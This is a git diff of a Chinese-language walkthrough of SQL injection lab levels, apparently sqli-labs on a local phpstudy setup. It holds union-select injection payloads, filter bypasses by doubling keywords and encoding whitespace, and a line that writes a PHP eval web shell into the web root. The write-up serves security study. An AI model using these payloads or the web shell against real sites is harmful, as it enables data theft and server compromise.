@@ -236,7 +236,7 @@ __很显然他是会返回错误信息的__
 
 所以，闭合方式是‘））
 
-# 直接写入
+* 直接写入
 ```
 ?id=-1')) union select 1,2,'<?php @eval($_POST["cmd"]);?>' into outfile "D:\\phpstudy_pro\\WWW\\q.php" --+
 ```
@@ -863,7 +863,147 @@ nice
 
 过。。。。
 
-## 24. 
+## 24. 出了点问题先跳过
+
+## 25. AND和or被绕过
+
+* 看一下闭合方式
+
+
+
+显然是‘闭合
+
+* 看下有没有回显
+```
+?id=-1' union select 1,2,3 --+
+```
+
+![image](https://user-images.githubusercontent.com/76896357/115099670-fe31ef80-9f69-11eb-8863-c204037a3fa8.png)
+
+还是有回显的
+
+* 查库
+
+```
+?id=-1' union select 1,2,database() --+
+```
+
+![image](https://user-images.githubusercontent.com/76896357/115099671-fe31ef80-9f69-11eb-9513-73448e37a1c4.png)
+
+* 查表
+```
+?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+?id=-1' union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+
+```
+
+![image](https://user-images.githubusercontent.com/76896357/115099731-608af000-9f6a-11eb-868f-118da39c30a4.png)
+
+看这就出毛病了
+
+but,双写一下就好了啊
+
+![image](https://user-images.githubusercontent.com/76896357/115099753-94feac00-9f6a-11eb-8a5b-d29a203728c0.png)
+
+加个group_concat完美些
+
+![image](https://user-images.githubusercontent.com/76896357/115099813-faeb3380-9f6a-11eb-8e8a-aa9f13a41d67.png)
+
+同样，构建password的时候也要写成passwoorrd
+
+这里就不介绍了。。。
+
+## 26. 过滤后的盲注
+
+* 查询闭合方式
+```
+?id=1' and 1=1 --+
+```
+![image](https://user-images.githubusercontent.com/76896357/115099874-6208e800-9f6b-11eb-825f-cf35a471ba8f.png)
+
+显然是‘闭合
+
+* 查看又没有回显
+
+![image](https://user-images.githubusercontent.com/76896357/115099911-abf1ce00-9f6b-11eb-9dd6-c4b4949809e5.png)
+
+没有回显，根据提示也能知道
+
+* 看看有没有报错
+
+```
+id=1' anandd 1=2 -- 
+```
+
+![image](https://user-images.githubusercontent.com/76896357/115099935-d3e13180-9f6b-11eb-9f42-5762b727f1cf.png)
+
+好家伙不仅没有报错，还把and和or过滤了
+
+![image](https://user-images.githubusercontent.com/76896357/115100004-5833b480-9f6c-11eb-9bc1-b6cdab9881a4.png)
+
+实在看不出来了，来代码审计吧
+
+![image](https://user-images.githubusercontent.com/76896357/115100036-90d38e00-9f6c-11eb-86ae-6b2d06be3ae6.png)
+
+好家伙，用了正则，过滤了这么多 or，and ，#，--，/*，/都没了，这里为什么要过滤/*，，，这家伙是多行注释，常用/**/来代替空格
+
+
+%a0    空格
+
+%09    tab
+
+还有其他方式
+```
+?id=1'%09||'1
+```
+![image](https://user-images.githubusercontent.com/76896357/115100349-9f22a980-9f6e-11eb-90a8-276c65e946c6.png)
+
+* 查看闭合方式
+
+
+
+由于输入什么都不显示,延时都不行，此案过。。。
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
